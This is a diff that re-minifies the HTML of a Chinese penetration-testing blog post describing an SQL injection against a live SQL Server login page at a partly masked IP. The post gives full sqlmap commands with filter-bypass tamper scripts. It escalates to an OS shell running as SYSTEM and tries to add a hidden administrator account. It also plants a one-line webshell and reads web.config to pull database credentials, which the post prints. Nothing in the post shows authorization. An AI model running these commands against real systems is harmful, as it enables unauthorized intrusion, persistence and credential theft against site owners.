@@ -1,90 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="注入 bypass"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>记一次 SQLServer 注入 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>记一次 SQLServer 注入</h1>
-      
-<div class="post-meta">
-    <time>2020-06-22</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>,<a href="/tags/bypass">bypass</a>)
-</div>
-
-      <div><h3 id="0x00-存在-sql-注入">0x00 存在 SQL 注入</h3>
-<p>总之是遇到一个站，登录的页面，数据包大致如下：</p>
-<pre tabindex="0"><code>POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="注入 bypass"><meta name=author content="Reber"><title>记一次 SQLServer 注入 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>记一次 SQLServer 注入</h1><div class=post-meta><time>2020-06-22</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>,<a href=/tags/bypass>bypass</a>)</div><div><h3 id=0x00-存在-sql-注入>0x00 存在 SQL 注入</h3><p>总之是遇到一个站，登录的页面，数据包大致如下：</p><pre tabindex=0><code>POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
 Host: 115.xxx.xxx.xxx:8042
 Content-Length: 47
 Accept: */*
@@ -100,129 +26,49 @@ Connection: close
 
 uname=admin*&amp;pwd=dskfsdkf&amp;valCode=1197&amp;telphone=
 </code></pre><p>其中验证码可以绕过，而登录名那里存在注入
-<img src="/img/post/Xnip2020-09-13_22-20-51.jpg" alt="">
-<img src="/img/post/Xnip2020-09-13_22-21-32.jpg" alt=""></p>
-<p>使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替
-<img src="/img/post/Xnip2020-09-13_22-30-08.jpg" alt="60">
-<img src="/img/post/Xnip2020-09-13_22-30-34.jpg" alt="60"></p>
-<h3 id="0x01-简单看一下">0x01 简单看一下</h3>
-<p>中间件是 IIS，存在 len 函数，确定为 SQLServer
-<img src="/img/post/Xnip2020-09-13_22-33-36.jpg" alt="60"></p>
-<p>Order by 一下，看看能不能 union，发现有 10 列
-<img src="/img/post/Xnip2020-09-13_22-34-56.jpg" alt="60"></p>
-<p>尝试 union select
-<img src="/img/post/Xnip2020-09-13_22-40-54.jpg" alt="80"></p>
-<p>admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示
-<img src="/img/post/Xnip2020-09-13_22-41-55.jpg" alt="80"></p>
-<p>可以获取数据库版本，可以确定有 union 注入了
-<img src="/img/post/Xnip2020-09-13_22-42-59.jpg" alt=""></p>
-<h3 id="0x02-sqlmap">0x02 sqlmap</h3>
-<p><code>sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms=&quot;mssql&quot; --random-agent --prefix=&quot;'&quot; --suffix=&quot;--&quot; --tamper=space2comment</code>
-<img src="/img/post/Xnip2020-09-13_22-45-24.jpg" alt=""></p>
-<p>比较奇怪，手工的时候可以 union 的，先看看 boolean-based 获取数据吧</p>
-<p>--current-db 倒是能获取到数据库名为 ExamDataP_2019，但是获取表名的时候就返回空了</p>
-<p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms=&quot;mssql&quot; --random-agent --prefix=&quot;'&quot; --suffix=&quot;--&quot; --tamper=space2comment -D ExamDataP_2019 --tables</code>
-<img src="/img/post/Xnip2020-09-13_22-46-35.jpg" alt=""></p>
-<p>能判断出来有注入，手工测试 and 1=1 时可以，测试 union 也可以，看来确实有过滤</p>
-<h3 id="0x03-探测过滤">0x03 探测过滤</h3>
-<p>看看过滤了啥，union 比较快，就用 union、-v 5 看下 payload</p>
-<p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms=&quot;mssql&quot; --random-agent --prefix=&quot;'&quot; --suffix=&quot;--&quot; --tamper=space2comment --technique=U --current-db -v 5</code></p>
-<p>直接拿最后一个 payload 测试下
-<img src="/img/post/Xnip2020-09-13_23-05-33.jpg" alt=""></p>
-<p>提示 98 附近有错误
-<img src="/img/post/Xnip2020-09-13_23-06-19.jpg" alt="80"></p>
-<p>感觉像过滤了char之类的函数，char 移到显示位，测一下</p>
-<p>发现有加号的时候出错，没有的时候就没问题，可能是处理加号了
-<img src="/img/post/Xnip2020-09-13_23-07-17.jpg" alt="80">
-<img src="/img/post/Xnip2020-09-13_23-08-12.jpg" alt="80"></p>
-<p>移到显示位测了下，确实处理加号了，替换为空了
-<img src="/img/post/Xnip2020-09-13_23-08-59.jpg" alt="80"></p>
-<h3 id="0x04-tamper">0x04 tamper</h3>
-<p>去网上找了能替换加号的，没有找到相关信息，后来想着 sqlmap 的 tamper 会不会有，结果还真有
-<img src="/img/post/Xnip2020-09-13_23-09-50.jpg" alt=""></p>
-<p>有两个 tamper，一个是适用 2012 的，一个是 2008 的，我们这里的数据库是 08 的，用 plus2fnconcat.py 这个，可以判断出来数据库了</p>
-<p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms=&quot;mssql&quot; --random-agent --prefix=&quot;'&quot; --suffix=&quot;--&quot; --tamper=space2comment,plus2fnconcat --technique=U --current-db</code>
-<img src="/img/post/Xnip2020-09-13_23-10-55.jpg" alt=""></p>
-<p>Emmmmm，可以获取数据库表，但是获取表的列名时依然不返回数据
-<img src="/img/post/Xnip2020-09-13_23-12-12.jpg" alt=""></p>
-<h3 id="0x05-再次探测过滤">0x05 再次探测过滤</h3>
-<p>同样 -v 3 看 payload，然后测试
-<img src="/img/post/Xnip2020-09-13_23-13-06.jpg" alt=""></p>
-<p>有语法错误，估计又是那个被替换为空了，慢慢试。。。</p>
-<p>看了下语句，涉及到的也就是 union、select、concat、cast、from、syscolumns、sysobjects、where、and 这些个可能被过滤的，union、select 没问题，前面测试过了，剩下的被处理的关键字感觉大概率是 from、and。。。。
-<img src="/img/post/Xnip2020-09-13_23-13-59.jpg" alt="70"></p>
-<p>语法错误。。。应该就是 from 了。能报错，还是想法报错到显示位</p>
-<p>emmmm，感觉好像没有哪里过滤。。。但就是有语法错误。。。
-<img src="/img/post/Xnip2020-09-13_23-14-57.jpg" alt=""></p>
-<p>网上查了下，其实前面的 from 出错是因为表的原因，from 1，没有 1 这个表，所以出错。。。。。</p>
-<p>sqlserver 和 mysql 不一样，还是用的少。。。
-<img src="/img/post/Xnip2020-09-13_23-15-38.jpg" alt="90"></p>
-<p>但是再次找个 pyaload 尝试依然有问题，不返回数据
-<img src="/img/post/Xnip2020-09-13_23-16-39.jpg" alt="70"></p>
-<p>同样的语句本地测试是可以返回数据的，费解
-<img src="/img/post/Xnip2020-09-13_23-17-18.jpg" alt="80"></p>
-<h3 id="0x06-os-shell">0x06 os-shell</h3>
-<p>实在没法了，--is-dba 为 True，直接 --os-shell
-<code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms=&quot;mssql&quot; --random-agent --prefix=&quot;'&quot; --suffix=&quot;--&quot; --tamper=space2comment,plus2fnconcat --os-shell</code>
-<img src="/img/post/Xnip2020-09-13_23-18-11.jpg" alt=""></p>
-<p>emmmmmm，system，啥都不说了。。。。。
-<img src="/img/post/Xnip2020-09-13_23-19-19.jpg" alt="90"></p>
-<p>看下端口
-<img src="/img/post/Xnip2020-09-13_23-19-55.jpg" alt="70"></p>
-<p>添加用户不行，卡死，估计是被拦截了
-<code>net user Guest1 Aa123456. /add &amp; net localgroup administrators Guest1 /add &amp; net user Guest1 /active:yes</code>
-<img src="/img/post/Xnip2020-09-13_23-20-30.jpg" alt=""></p>
-<p>看了下 tasklist，有 360，先传个 shell 吧，方便后续渗透</p>
-<p>找路径: <code>dir /s /b e:\&quot;username.jpg&quot;</code>
-<img src="/img/post/Xnip2020-09-13_23-21-31.jpg" alt="70"></p>
-<p>通过 echo 写 txt 判断路径，试了几个都不是，写中文路径提示不存在。。。。。
-<img src="/img/post/Xnip2020-09-13_23-22-51.jpg" alt=""></p>
-<p>本来网上查可以用 bat 写中文路径文件，用了 certutil、bitsadmin、powershell 都没有下载成功</p>
-<p>看下有没有不是不包含中文的 web 路径: <code>type C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
-<p>发现 80 端口路径为 c:\inetpub\wwwroot<br>
-<img src="/img/post/Xnip2020-09-13_23-23-33.jpg" alt="85"></p>
-<p>写一句话:
-<img src="/img/post/Xnip2020-09-13_23-24-28.jpg" alt=""></p>
-<p>访问后出错
-<img src="/img/post/Xnip2020-09-13_23-25-10.jpg" alt="70"></p>
-<p>后续测试发现通过浏览器写中文名的话可以，创建了文件 9d.txt，证明网站路径就是 e:\江xxxx网站\JsWeb<br>
-<img src="/img/post/Xnip2020-09-13_23-26-00.jpg" alt="90"></p>
-<p>现在的话就知道了目标的绝对路径为 e:\江xxxx网站\JsWeb\，同时目标的 80 端口的绝对路径为 c:\inetpub\wwwroot\</p>
-<p>PS: 由于当时有别的事，没有继续向下做，其实还可以数据库备份 shell 到网站目录，后续也见到了一个不会出现 &ldquo;/&rdquo; 应用程序中的服务错误的 webshell</p>
-<h3 id="0x07-找数据库信息">0x07 找数据库信息</h3>
-<p>找 Web.config，<code>dir /s /b e:\&quot;Web.config&quot;，type e:\b2cexam\web.config</code>
+<img src=/img/post/Xnip2020-09-13_22-20-51.jpg alt>
+<img src=/img/post/Xnip2020-09-13_22-21-32.jpg alt></p><p>使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替
+<img src=/img/post/Xnip2020-09-13_22-30-08.jpg alt=60>
+<img src=/img/post/Xnip2020-09-13_22-30-34.jpg alt=60></p><h3 id=0x01-简单看一下>0x01 简单看一下</h3><p>中间件是 IIS，存在 len 函数，确定为 SQLServer
+<img src=/img/post/Xnip2020-09-13_22-33-36.jpg alt=60></p><p>Order by 一下，看看能不能 union，发现有 10 列
+<img src=/img/post/Xnip2020-09-13_22-34-56.jpg alt=60></p><p>尝试 union select
+<img src=/img/post/Xnip2020-09-13_22-40-54.jpg alt=80></p><p>admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示
+<img src=/img/post/Xnip2020-09-13_22-41-55.jpg alt=80></p><p>可以获取数据库版本，可以确定有 union 注入了
+<img src=/img/post/Xnip2020-09-13_22-42-59.jpg alt></p><h3 id=0x02-sqlmap>0x02 sqlmap</h3><p><code>sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment</code>
+<img src=/img/post/Xnip2020-09-13_22-45-24.jpg alt></p><p>比较奇怪，手工的时候可以 union 的，先看看 boolean-based 获取数据吧</p><p>--current-db 倒是能获取到数据库名为 ExamDataP_2019，但是获取表名的时候就返回空了</p><p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment -D ExamDataP_2019 --tables</code>
+<img src=/img/post/Xnip2020-09-13_22-46-35.jpg alt></p><p>能判断出来有注入，手工测试 and 1=1 时可以，测试 union 也可以，看来确实有过滤</p><h3 id=0x03-探测过滤>0x03 探测过滤</h3><p>看看过滤了啥，union 比较快，就用 union、-v 5 看下 payload</p><p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment --technique=U --current-db -v 5</code></p><p>直接拿最后一个 payload 测试下
+<img src=/img/post/Xnip2020-09-13_23-05-33.jpg alt></p><p>提示 98 附近有错误
+<img src=/img/post/Xnip2020-09-13_23-06-19.jpg alt=80></p><p>感觉像过滤了char之类的函数，char 移到显示位，测一下</p><p>发现有加号的时候出错，没有的时候就没问题，可能是处理加号了
+<img src=/img/post/Xnip2020-09-13_23-07-17.jpg alt=80>
+<img src=/img/post/Xnip2020-09-13_23-08-12.jpg alt=80></p><p>移到显示位测了下，确实处理加号了，替换为空了
+<img src=/img/post/Xnip2020-09-13_23-08-59.jpg alt=80></p><h3 id=0x04-tamper>0x04 tamper</h3><p>去网上找了能替换加号的，没有找到相关信息，后来想着 sqlmap 的 tamper 会不会有，结果还真有
+<img src=/img/post/Xnip2020-09-13_23-09-50.jpg alt></p><p>有两个 tamper，一个是适用 2012 的，一个是 2008 的，我们这里的数据库是 08 的，用 plus2fnconcat.py 这个，可以判断出来数据库了</p><p><code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment,plus2fnconcat --technique=U --current-db</code>
+<img src=/img/post/Xnip2020-09-13_23-10-55.jpg alt></p><p>Emmmmm，可以获取数据库表，但是获取表的列名时依然不返回数据
+<img src=/img/post/Xnip2020-09-13_23-12-12.jpg alt></p><h3 id=0x05-再次探测过滤>0x05 再次探测过滤</h3><p>同样 -v 3 看 payload，然后测试
+<img src=/img/post/Xnip2020-09-13_23-13-06.jpg alt></p><p>有语法错误，估计又是那个被替换为空了，慢慢试。。。</p><p>看了下语句，涉及到的也就是 union、select、concat、cast、from、syscolumns、sysobjects、where、and 这些个可能被过滤的，union、select 没问题，前面测试过了，剩下的被处理的关键字感觉大概率是 from、and。。。。
+<img src=/img/post/Xnip2020-09-13_23-13-59.jpg alt=70></p><p>语法错误。。。应该就是 from 了。能报错，还是想法报错到显示位</p><p>emmmm，感觉好像没有哪里过滤。。。但就是有语法错误。。。
+<img src=/img/post/Xnip2020-09-13_23-14-57.jpg alt></p><p>网上查了下，其实前面的 from 出错是因为表的原因，from 1，没有 1 这个表，所以出错。。。。。</p><p>sqlserver 和 mysql 不一样，还是用的少。。。
+<img src=/img/post/Xnip2020-09-13_23-15-38.jpg alt=90></p><p>但是再次找个 pyaload 尝试依然有问题，不返回数据
+<img src=/img/post/Xnip2020-09-13_23-16-39.jpg alt=70></p><p>同样的语句本地测试是可以返回数据的，费解
+<img src=/img/post/Xnip2020-09-13_23-17-18.jpg alt=80></p><h3 id=0x06-os-shell>0x06 os-shell</h3><p>实在没法了，--is-dba 为 True，直接 --os-shell
+<code>sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment,plus2fnconcat --os-shell</code>
+<img src=/img/post/Xnip2020-09-13_23-18-11.jpg alt></p><p>emmmmmm，system，啥都不说了。。。。。
+<img src=/img/post/Xnip2020-09-13_23-19-19.jpg alt=90></p><p>看下端口
+<img src=/img/post/Xnip2020-09-13_23-19-55.jpg alt=70></p><p>添加用户不行，卡死，估计是被拦截了
+<code>net user Guest1 Aa123456. /add & net localgroup administrators Guest1 /add & net user Guest1 /active:yes</code>
+<img src=/img/post/Xnip2020-09-13_23-20-30.jpg alt></p><p>看了下 tasklist，有 360，先传个 shell 吧，方便后续渗透</p><p>找路径: <code>dir /s /b e:\"username.jpg"</code>
+<img src=/img/post/Xnip2020-09-13_23-21-31.jpg alt=70></p><p>通过 echo 写 txt 判断路径，试了几个都不是，写中文路径提示不存在。。。。。
+<img src=/img/post/Xnip2020-09-13_23-22-51.jpg alt></p><p>本来网上查可以用 bat 写中文路径文件，用了 certutil、bitsadmin、powershell 都没有下载成功</p><p>看下有没有不是不包含中文的 web 路径: <code>type C:\Windows\System32\inetsrv\config\applicationHost.config</code></p><p>发现 80 端口路径为 c:\inetpub\wwwroot<br><img src=/img/post/Xnip2020-09-13_23-23-33.jpg alt=85></p><p>写一句话:
+<img src=/img/post/Xnip2020-09-13_23-24-28.jpg alt></p><p>访问后出错
+<img src=/img/post/Xnip2020-09-13_23-25-10.jpg alt=70></p><p>后续测试发现通过浏览器写中文名的话可以，创建了文件 9d.txt，证明网站路径就是 e:\江xxxx网站\JsWeb<br><img src=/img/post/Xnip2020-09-13_23-26-00.jpg alt=90></p><p>现在的话就知道了目标的绝对路径为 e:\江xxxx网站\JsWeb\，同时目标的 80 端口的绝对路径为 c:\inetpub\wwwroot\</p><p>PS: 由于当时有别的事，没有继续向下做，其实还可以数据库备份 shell 到网站目录，后续也见到了一个不会出现 &ldquo;/&rdquo; 应用程序中的服务错误的 webshell</p><h3 id=0x07-找数据库信息>0x07 找数据库信息</h3><p>找 Web.config，<code>dir /s /b e:\"Web.config"，type e:\b2cexam\web.config</code>
 获取到一个数据库用户名密码user id=kw;password=123456;
-<img src="/img/post/Xnip2020-09-13_23-27-23.jpg" alt="">
-<img src="/img/post/Xnip2020-09-13_23-29-21.jpg" alt=""></p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/Xnip2020-09-13_23-27-23.jpg alt>
+<img src=/img/post/Xnip2020-09-13_23-29-21.jpg alt></p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
